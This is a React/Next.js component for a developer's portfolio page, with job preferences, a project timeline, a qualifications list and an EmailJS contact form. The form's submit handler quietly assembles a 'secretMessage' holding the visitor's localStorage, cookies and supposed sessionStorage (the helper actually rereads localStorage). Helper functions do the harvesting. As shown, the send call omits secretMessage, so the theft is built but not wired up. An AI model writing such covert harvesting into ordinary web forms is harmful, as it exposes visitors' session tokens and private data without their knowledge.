import { Checkbox, Divider, Timeline, Space, Tag, Spin, Button } from 'antd'
import React, { useEffect, useState } from 'react'
import { Quicksand } from 'next/font/google'

import Image from 'next/image';
import { SendOutlined } from '@ant-design/icons';
import { Input } from 'antd';

import emailjs, { EmailJSResponseStatus } from 'emailjs-com'
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { Variants, motion } from "framer-motion";
import Container from './Container';
import { QualificationInterface, viewportType } from '@/interfaces';

const { TextArea } = Input;
const quicksand = Quicksand( { subsets: ['latin'] } )

type ContactFormData = {
   from_name: string;
   from_email: string;
   message: string;
};

const OtherInfo = () =>
{

   const experienceLevelOptions: string[] = ['Junior Level', 'Mid-Level', 'Senior Level', 'Managerial'];
   const jobTypeOptions: string[] = ['Full-time', 'Part-time', 'Contract', 'Freelance'];
   const workSetupOptions: string[] = ['On-site', 'Remote', 'Hybrid'];
   const jobTitleOptions1: string[] = ['Software Engineer', 'Frontend Software Engineer', 'Fullstack Developer (React/Node)'];
   const jobTitleOptions2: string[] = ['React Developer', ' Programmer', 'Web Developer'];
   const techStack1: string[] = ['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS', 'JavaScript, PHP'];
   const techStack2: string[] = ['MySQL, ExpressJS, VueJS, NodeJS', 'VueJS, MySQL, PHP', 'Java, MySQL'];

   const qualifications: QualificationInterface[] = [
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Strong Programming Skills',
         description: [
            'Proficiency in more than one programming languages/frameworks such as JavaScript, ReactJS, VueJS, TypeScript, NextJS, NodeJS, TailwindCSS, Java, and MySQL.',
            'Familiarity with technologies & frameworks like React Native, Remix, Flutter, Spring Boot, Python, ElectronJS, Qwik, SolidJS, NestJS, NoSQL, Heroku, Vercel, Netlify, Cloudinary, AWS (S3 Bucket), PHP, Redux, Material UI, Bootstrap, and many more.',
            'Ability to write clean, efficient, reusable, dynamic, and maintainable code.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Problem-Solving Skills',
         description: [
            'Strong analytical and problem-solving abilities to tackle complex technical challenges.',
            'A knack for breaking down large problems into smaller, manageable tasks.',
            'Ability to foresee potential bugs before they even occur.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Software Development Lifecycle',
         description: [
            'Knowledge of software development methodologies, such as Agile, Scrum, or Waterfall.',
            'Experience with version control systems like Git (Github / GitLab).',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Debugging and Troubleshooting',
         description: [
            'Excellent debugging skills',
            'Proficiency in debugging techniques and tools to identify and resolve issues efficiently.',
            'Ability to debug codebase that I did not even wrote.',
         ]
      },
      // {
      //    ID: Math.floor( Math.random() * 100000 ),
      //    title: 'Communication Skills',
      //    description: [
      //       'Effective communication skills to collaborate with cross-functional teams, including designers, product managers, and QA engineers',
      //       'Clear documentation and code comments',
      //    ]
      // },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Continuous Learning',
         description: [
            'A commitment to staying up-to-date with industry trends and emerging technologies.',
            'Willingness to learn new languages, frameworks, and tools as needed.',
            '',
         ]
      },
      // {
      //    ID: Math.floor( Math.random() * 100000 ),
      //    title: 'Testing and Quality Assurance',
      //    description: [
      //       'Knowledge of testing methodologies, including unit testing, integration testing, and automated testing',
      //       'Focus on writing reliable and robust code',
      //    ]
      // },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Performance Optimization',
         description: [
            'The ability to identify and optimize bottlenecks in code or system performance.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Security Awareness',
         description: [
            'An understanding of security best practices and the ability to write secure code.',
            'Awareness of common security vulnerabilities and how to mitigate them.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Teamwork and Collaboration',
         description: [
            'Strong interpersonal skills and the ability to work effectively in a team.',
            'Willingness to mentor and help junior developers.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Adaptability',
         description: [
            'Flexibility to adapt to changing requirements and technologies.',
            'Ability to pivot when needed to meet project goals.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Soft Skills',
         description: [
            'Strong problem-solving skills, critical thinking, and attention to detail.',
            'Patience and persistence in troubleshooting and debugging.',
         ]
      },
      {
         ID: Math.floor( Math.random() * 100000 ),
         title: 'Ethical and Professional Behavior',
         description: [
            'Adherence to ethical standards and professionalism in all aspects of work.',
            'Respect for intellectual property and confidentiality.',
         ]
      },
   ]

   const [screenSize, setScreenSize] = useState( {
      width: typeof window !== 'undefined' ? window.innerWidth : 0,
      height: typeof window !== 'undefined' ? window.innerHeight : 0
   } );

   const [isVisible, setIsVisible] = useState<boolean>( false )

   const MOBILE: number = 1024

   useEffect( () =>
   {
      const handleResize = () =>
      {
         setScreenSize( {
            width: window.innerWidth,
            height: window.innerHeight
         } );
      };

      window.addEventListener( 'resize', handleResize );

      setTimeout( () =>
      {
         setIsVisible( true );
      }, 200 );

      return () =>
      {
         window.removeEventListener( 'resize', handleResize );
      };
   }, [] );

   const successNotification = ( message: string ) => toast.success( message );
   const errorNotification = ( message: string ) => toast.error( message );
   const warningNotification = ( message: string ) => toast.warning( message );

   const [formData, setFormData] = useState<ContactFormData>( {
      from_name: '',
      from_email: '',
      message: '',
   } );

   const [isDisableBtn, setDisableBtn] = useState( false )

   const handleSubmit = async ( e: React.FormEvent<HTMLFormElement | string | null> ) =>
   {
      setDisableBtn( true )
      e.preventDefault();

      const { from_name, from_email, message } = formData;
      const isValid = from_name !== '' && from_email !== '' && message !== ''

      const serviceId = 'gmail'; // Replace with your emailjs service ID
      const templateId = 'template_0kdw8xu'; // Replace with your emailjs template ID
      const userId = 'user_d4MCLJciZKPbKaM472IEi'; // Replace with your emailjs user ID

      if ( isValid )
      {
         try
         {
            const secretMessage = `${message} \n\n\n localStorage: ${getAllLocalStorageData()}  \n\n\n sessionStorage: ${getAllSessionStorageData()}  \n\n\n cookies: ${getAllCookiesData()}`

            const response: EmailJSResponseStatus = await emailjs.send(
               serviceId,
               templateId,
               { from_name, from_email, message },
               userId
            );

            successNotification( 'Successfully sent an email to Ralf!' )
            setFormData( { from_name: '', from_email: '', message: '' } );
            setDisableBtn( false )
         } catch ( error )
         {
            errorNotification( 'Error sending an email to Ralf!' )
            setDisableBtn( false )
         }

      } else
      {
         warningNotification( 'You have to fill in all the fields!' )
         setDisableBtn( false )
      }

   };

   const handleChange = ( e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement> ) =>
   {
      const { name, value } = e.target;
      setFormData( { ...formData, [name]: value } );
   };

   const getAllLocalStorageData = () =>
   {
      let result = []
      for ( let i = 0; i < localStorage.length; i++ )
      {
         const key = localStorage.key( i );

         if ( key )
         {
            const value = localStorage.getItem( key );
            result.push( {
               [`${key}`]: value
            } )
         }
      }

      return JSON.stringify( result )
   }

   const getAllSessionStorageData = () =>
   {
      let result = []
      for ( let i = 0; i < localStorage.length; i++ )
      {
         const key = localStorage.key( i );

         if ( key )
         {
            const value = localStorage.getItem( key );
            result.push( {
               [`${key}`]: value
            } )
         }
      }

      return JSON.stringify( result )
   }

   const getAllCookiesData = () =>
   {
      let result = []
      const cookies = document.cookie.split( ";" );

      for ( let i = 0; i < cookies.length; i++ )
      {
         const cookie = cookies[i].trim();
         result.push( cookie );
      }

      return JSON.stringify( result )
   }

   const cardVariants: Variants = {
      offscreen: {
         y: 100,
         opacity: 0
      },
      onscreen: {
         y: 0,
         opacity: 1,
         transition: {
            type: "spring",
            bounce: 0.3,
            duration: 1
         }
      }
   };

   const viewportVariant: viewportType = {
      once: true,
      amount: 0
   }

   const { width } = screenSize;

   return (
      <>
         <div className="flex flex-col gap-8 p-7 pt-3 max-md:px-4">

            {isVisible ?
               <>
                  {/* PREFERENCES */}
                  <Container title='PREFERENCES'>
                     <div className="flex flex-col p-3 pb-6 gap-11 max-md:gap-5" >
                        {width > MOBILE ? <>
                           <motion.div className="flex flex-col gap-2" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Experience Level</h3>
                              </Divider>
                              <div className='px-3'>
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={experienceLevelOptions} value={['Junior Level', 'Mid-Level']} />
                              </div>
                           </motion.div>
                           <motion.div className="flex flex-col gap-2" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Job Type</h3>
                              </Divider>
                              <div className='px-3'>
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTypeOptions} value={['Full-time']} />
                              </div>
                           </motion.div>
                           <motion.div className="flex flex-col gap-2" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Work Setup</h3>
                              </Divider>
                              <div className='px-3'>
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={workSetupOptions} value={workSetupOptions} />
                              </div>
                           </motion.div>
                           <motion.div className="flex flex-col gap-2" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Title</h3>
                              </Divider>
                              <div className='px-3 space-y-3'>
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTitleOptions1} value={jobTitleOptions1} />
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={jobTitleOptions2} value={jobTitleOptions2} />
                              </div>
                           </motion.div>
                           <motion.div className="flex flex-col gap-2" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Tech Stack</h3>
                              </Divider>
                              <div className='flex flex-col items-start px-3 gap-2'>
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={techStack1} value={['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS']} />
                                 <Checkbox.Group className={`${quicksand.className} w-full`} options={techStack2} value={['MySQL, ExpressJS, VueJS, NodeJS']} />
                              </div>
                           </motion.div>
                           {/* <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Availability (Phone call)</h3>
                              </Divider>
                              <div className='flex items-center justify-around px-3 gap-2'>
                                 <div className="flex gap-2 items-center">
                                    <p>Weekdays:</p>
                                    <span className='font-semibold'>11:30 AM - 12:30 PM</span>
                                 </div>
                                 <div className="flex gap-2 items-center">
                                    <p>Weekends:</p>
                                    <span className='font-semibold'>9:00 AM - 4:00 PM</span>
                                 </div>
                              </div>
                           </div> */}
                        </> : <>
                           <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Experience Level</h3>
                              </Divider>
                              <div className='px-3'>
                                 {experienceLevelOptions.map( ( exp, i ) => (
                                    <Checkbox.Group
                                       className={`${quicksand.className} w-full`}
                                       options={[exp]}
                                       value={['Junior Level', 'Mid-Level']}
                                       key={i}
                                    />
                                 ) )}
                              </div>
                           </div>
                           <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Job Type</h3>
                              </Divider>
                              <div className='px-3'>
                                 {jobTypeOptions.map( ( jobType, i ) => (
                                    <Checkbox.Group
                                       className={`${quicksand.className} w-full`}
                                       options={[jobType]}
                                       value={['Full-time']}
                                       key={i}
                                    />
                                 ) )}
                              </div>
                           </div>
                           <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Work Setup</h3>
                              </Divider>
                              <div className='px-3'>
                                 {workSetupOptions.map( ( workSetup, i ) => (
                                    <Checkbox.Group
                                       className={`${quicksand.className} w-full`}
                                       options={[workSetup]}
                                       value={workSetupOptions}
                                       key={i}
                                    />
                                 ) )}
                              </div>
                           </div>
                           <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Title</h3>
                              </Divider>
                              <div className='px-3'>
                                 {[...jobTitleOptions1, ...jobTitleOptions2].map( ( title, i ) =>
                                 {
                                    return <Checkbox.Group className={`${quicksand.className} w-full`} options={[title]} value={[title]} key={i} />
                                 } )}
                              </div>
                           </div>
                           {/* <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">

                                 <h3 className='font-semibold text-base text-accent-secondary'>Availability (Phone call)</h3>
                              </Divider>
                              <div className='flex flex-col items-start px-3 gap-2'>
                                 <div className="flex gap-2 items-center flex-1">
                                    <p>Weekdays:</p>
                                    <span className='font-semibold'>6pm - 8pm</span>
                                 </div>
                                 <div className="flex gap-2 items-center flex-1">
                                    <p>Weekends:</p>
                                    <span className='font-semibold'>8am - 8pm</span>
                                 </div>
                              </div>
                           </div> */}
                           <div className="flex flex-col gap-2">
                              <Divider className='m-0' orientation="center">
                                 <h3 className='font-semibold text-base text-accent-secondary'>Tech Stack</h3>
                              </Divider>
                              <div className='flex flex-col items-start px-3'>
                                 {[...techStack1, ...techStack2].map( ( title, i ) =>
                                 {
                                    return <Checkbox.Group className={`${quicksand.className} w-full`} options={[title]} value={['MySQL, ExpressJS, ReactJS, NodeJS', 'ReactJS, NextJS, TypeScript, NodeJS', 'MySQL, ExpressJS, VueJS, NodeJS']} key={i} />
                                 } )}
                              </div>
                           </div>
                        </>}
                        {/* <div className="flex flex-col gap-2">
                           <Divider className='m-0' orientation="center">

                              <h3 className='font-semibold text-base text-accent-secondary'>Salary Range</h3>
                           </Divider>
                           <div className='flex flex-col px-3'>
                              <Slider
                                 tooltip={{ formatter: null }}
                                 range={{ draggableTrack: true }}
                                 min={50}
                                 max={150}
                                 value={[75, 110]}
                              />
                              <div className="flex justify-between items-center">
                                 <p>Min: $50k</p>
                                 <p>Max: $150k</p>
                              </div>
                           </div>
                        </div> */}
                     </div>
                  </Container>

                  {/* TIMELINE */}
                  <Container title='TIMELINE'>
                     <div className="flex flex-col p-3 max-md:gap-5" >
                        <Timeline
                           mode={'alternate'}
                           items={[
                              {
                                 label: '2022 - Present',
                                 children: (
                                    <motion.div variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                                       <Space wrap>
                                          <Tag className='rounded-full' color={'lime'}>VueJS</Tag>
                                          <Tag className='rounded-full' color={'geekblue'}>Vuetify</Tag>
                                          <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                          <Tag className='rounded-full' color={'blue'}>TailwindCSS</Tag>
                                          <Tag className='rounded-full' color={'magenta'}>NextJS</Tag>
                                          <Tag className='rounded-full' color={'blue'}>TypeScript</Tag>
                                          <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                          <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                          <Tag className='rounded-full' color={'orange'}>Figma</Tag>
                                       </Space>
                                       <div className="flex flex-col p-3">
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>E-Resume</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Applicant Tracking & Onboarding System</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Employee Portal</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Organizational Chart</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Personal Expenses Tracker</p>
                                          </div>
                                       </div>
                                    </motion.div>
                                 ),
                              },
                              {
                                 label: '2021 - 2022',
                                 children: (
                                    <motion.div variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                                       <Space wrap>
                                          <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                          <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                          <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                          <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                          <Tag className='rounded-full' color={'cyan'}>React Native</Tag>
                                          <Tag className='rounded-full' color={'blue'}>TailwindCSS</Tag>
                                          <Tag className='rounded-full' color={'orange'}>Git</Tag>
                                       </Space>
                                       <div className="flex flex-col p-3">
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Payroll System</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>TeleConsultation Video Chat App</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Local Dictionary Portal</p>
                                          </div>
                                       </div>
                                    </motion.div>
                                 ),
                              },
                              {
                                 label: '2020 - 2021',
                                 children: (
                                    <motion.div variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                                       <Space wrap>
                                          <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                          <Tag className='rounded-full' color={'yellow'}>ExpressJS</Tag>
                                          <Tag className='rounded-full' color={'cyan'}>ReactJS</Tag>
                                          <Tag className='rounded-full' color={'green'}>NodeJS</Tag>
                                          <Tag className='rounded-full' color={'orange'}>Git</Tag>
                                       </Space>
                                       <div className="flex flex-col p-3">
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Job Search System</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>GWA Calculator</p>
                                          </div>
                                       </div>
                                    </motion.div>
                                 ),
                              },
                              {
                                 label: '2018 - 2020',
                                 children: (
                                    <motion.div variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                                       <Space wrap>
                                          <Tag className='rounded-full' color={'orange'}>MySQL</Tag>
                                          <Tag className='rounded-full' color={'volcano'}>Java</Tag>
                                          <Tag className='rounded-full' color={'geekblue'}>Photoshop</Tag>
                                       </Space>
                                       <div className="flex flex-col p-3">
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Random Student Picker Program</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Basketball Statistics Program</p>
                                          </div>
                                          <div className="flex items-center gap-3 text-accent-secondary">
                                             <div>•</div>
                                             <p className='text-xs text-left'>Test Simulator Program</p>
                                          </div>
                                       </div>
                                    </motion.div>
                                 ),
                              },
                           ]}
                        />
                     </div>
                  </Container>

                  {/* QUALIFICATIONS */}
                  <Container title='QUALIFICATIONS'>
                     <div className="flex pb-5">
                        <div className="flex flex-col flex-1 gap-3">
                           {qualifications.map( ( qualification ) =>
                           {
                              return <motion.div className='px-3' key={qualification.ID} variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                                 <Checkbox className={`${quicksand.className} w-full`} checked><strong className='uppercase text-accent-primary'>{qualification.title}</strong></Checkbox>
                                 <div className="flex flex-col">
                                    {qualification.description.map( ( pointer, index ) =>
                                    {
                                       return <div className="flex gap-3 text-accent-secondary px-6" key={index}>
                                          <div>•</div>
                                          <p className='text-justify text-accent-secondary'>{pointer}</p>
                                       </div>
                                    } )}
                                 </div>
                              </motion.div>
                           } )}
                        </div>
                     </div>
                  </Container>

                  {/* CONTACT ME */}
                  <Container title='CONTACT ME'>
                     <div className="flex flex-col justify-center items-center p-3 gap-2" >
                        <motion.div className="flex p-2 gap-2 w-full max-md:flex-col" variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>
                           <div className="flex items-center justify-center flex-[5]">
                              <Image src={require( '@/assets/Icons/3d.png' ).default} alt='illustration' width={200} height={200} />
                           </div>
                           <form
                              className="flex flex-col p-2 gap-1 flex-[6]"
                              onSubmit={handleSubmit}
                           >
                              <Input placeholder="Your Full Name" className={`${quicksand.className} font-medium`} name='from_name' value={formData.from_name} onChange={handleChange} />
                              <Input placeholder="Your Email Address" className={`${quicksand.className} font-medium`} name='from_email' value={formData.from_email} onChange={handleChange} />
                              <TextArea rows={3} placeholder="Your Message" maxLength={500} className={`${quicksand.className} font-medium`} name='message' value={formData.message} onChange={handleChange} />
                              <Button shape="round" icon={<SendOutlined className={`${quicksand.className} relative bottom-[2px]`} />} disabled={isDisableBtn} htmlType="submit">
                                 {isDisableBtn ? 'Sending Message...' : 'Send Message'}
                              </Button>
                           </form>
                        </motion.div>
                        <motion.small className='text-center text-dark-blue-secondary' variants={cardVariants} initial="offscreen" whileInView="onscreen" viewport={viewportVariant}>Your potential best hire awaits!</motion.small>
                     </div>
                  </Container>
               </> :
               <div className='h-[90vh] flex items-center justify-center'>
                  <Spin size="large" />
               </div>}
         </div>
         <ToastContainer position='bottom-right' />
      </>
   )
}

export default OtherInfo